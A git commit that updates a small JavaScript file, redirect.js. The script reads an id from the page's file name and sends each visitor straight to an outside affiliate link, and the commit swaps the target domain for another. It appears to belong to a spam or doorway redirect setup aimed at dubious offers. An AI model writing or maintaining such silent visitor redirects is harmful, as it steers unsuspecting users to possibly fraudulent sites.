32f9680482bbb378b8d120d71b3f09727782d265
Kraken502 <royality_brazmiality@ukr.net>
2025-06-23 09:56:20 +0300

    Update redirect.js

--- redirect.js
+++ redirect.js
@@ -2,7 +2,7 @@
 const uid = window.location.pathname.split('/').pop().replace('.html', '');
 
 // Ссылка для редиректа
-const baseUrl = "https://achieveyourvictories.com/K6GKc1w5?param=" + uid + "&aff_sub=10sale";
+const baseUrl = "https://platinumcapitalmy.com/kG6KC1w5?param=" + uid + "&aff_sub=10sale";
 
 // Редирект
 window.location.href = baseUrl;
